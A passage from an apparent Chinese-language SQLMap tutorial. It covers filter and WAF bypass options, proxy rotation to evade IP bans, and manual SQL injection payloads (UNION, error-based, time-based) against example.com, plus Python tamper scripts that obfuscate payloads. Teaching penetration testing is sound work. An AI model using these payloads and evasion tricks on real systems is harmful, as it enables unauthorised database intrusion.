<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 技巧1: 绕过参数名过滤</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 如果过滤了 &quot;id&quot; 参数，使用其他参数</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;pid,uid,cid&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 技巧2: 绕过关键字过滤</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用tamper脚本混淆</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tamper</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">randomcase,space2comment,between</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 技巧3: 绕过长度限制</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用最短的payload</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--technique</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">B</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 技巧4: 绕过频率限制</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 添加请求延时</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--delay</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">5</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --safe-url</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://example.com/&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --safe-freq</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">3</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 技巧5: 绕过IP封禁</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用代理池</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--proxy-file</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">proxies.txt</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> --random-agent</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 技巧6: 绕过User-Agent检测</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用真实浏览器UA或随机UA</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--user-agent</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;</span></span></code></pre></figure>
<h4 id="手动验证方法">手动验证方法<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#手动验证方法" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 1. 布尔盲注验证</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 原始: http://example.com/page.php?id=1</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试: http://example.com/page.php?id=1 AND 1=1  (正常)</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试: http://example.com/page.php?id=1 AND 1=2  (异常)</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 2. 联合查询验证</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 判断列数: ?id=1 ORDER BY 1,2,3...</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 联合查询: ?id=-1 UNION SELECT 1,2,3,4</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 3. 报错注入验证</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ?id=1 AND updatexml(1,concat(0x7e,version()),1)</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 4. 时间盲注验证</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ?id=1 AND SLEEP(5)</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用SQLMap验证手工发现的注入</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --technique=B</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --string=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;成功&quot;</span></span></code></pre></figure>
<h2 id="十一扩展与进阶">十一、扩展与进阶<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#十一扩展与进阶" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="111-自定义开发">11.1 自定义开发<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#111-自定义开发" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<h4 id="tamper脚本编写">Tamper脚本编写<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#tamper脚本编写" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="python" data-theme="github-light github-dark"><code data-language="python" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#!/usr/bin/env python</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># custom_tamper.py - 自定义Tamper脚本模板</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">Copyright (c) 2006-2024 sqlmap developers</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">See the file 'LICENSE' for copying permission</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">说明: 将空格替换为制表符</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">示例: SELECT * FROM users</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">      SELECT%09*%09FROM%09users</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;&quot;&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> lib.core.enums </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> PRIORITY</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 脚本优先级</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">__priority__ </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> PRIORITY</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">NORMAL</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> dependencies</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">():</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    声明依赖项（可选）</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    pass</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> tamper</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(payload, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">**</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">kwargs):</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    主要的Tamper函数</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    </span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    参数:</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        payload: 原始payload字符串</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    </span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    返回:</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        修改后的payload字符串</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload:</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 将空格替换为制表符(%09)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        payload </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload.replace(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">' '</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'%09'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试代码</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">if</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> __name__</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> ==</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '__main__'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 测试tamper函数</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    test_payload </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;SELECT * FROM users WHERE id=1&quot;</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;原始:&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, test_payload)</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;修改:&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, tamper(test_payload))</span></span></code></pre></figure>
<h4 id="更多tamper示例">更多Tamper示例<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#更多tamper示例" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="python" data-theme="github-light github-dark"><code data-language="python" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例1: 关键字大小写混淆</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> tamper</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(payload, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">**</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">kwargs):</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload:</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> random</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        result </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        for</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> char </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">in</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload:</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> char.isalpha():</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                result </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> char.upper() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> random.randint(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">else</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> char.lower()</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            else</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                result </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> char</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> result</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例2: 注释符混淆</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> tamper</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(payload, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">**</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">kwargs):</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    comments </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'/**/'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'/*test*/'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'/*!50000*/'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload:</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> random</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        words </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload.split(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">' '</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> random.choice(comments).join(words)</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例3: 编码混合</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> tamper</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(payload, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">**</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">kwargs):</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload:</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        result </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        for</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> char </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">in</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload:</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> char </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">==</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ' '</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                result </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '%09'</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  # Tab</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            elif</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> char </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">==</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '='</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                result </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '%3D'</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  # URL编码</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            else</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                result </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> char</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> result</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> payload</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用自定义Tamper</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">sqlmap </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">u </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;url&quot;</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;"> --</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">tamper</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">path</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">to</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">custom_tamper.py</span></span></code></pre></figure>
<h4 id="插件开发">插件开发<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#插件开发" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="python" data-theme="github-light github-dark"><code data-language="python" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># sqlmap/plugins/generic/custom.py</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 自定义SQLMap插件示例</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> lib.core.common </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Backend</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> lib.core.data </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> conf</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> lib.core.data </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> kb</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> lib.core.data </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> logger</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">class</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> CustomPlugin</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    自定义插件类</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> __init__</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self):</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        pass</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> checkDbms</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self):</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        检测数据库类型</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        infoMsg </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;正在执行自定义检测...&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        logger.info(infoMsg)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 自定义检测逻辑</span></span>
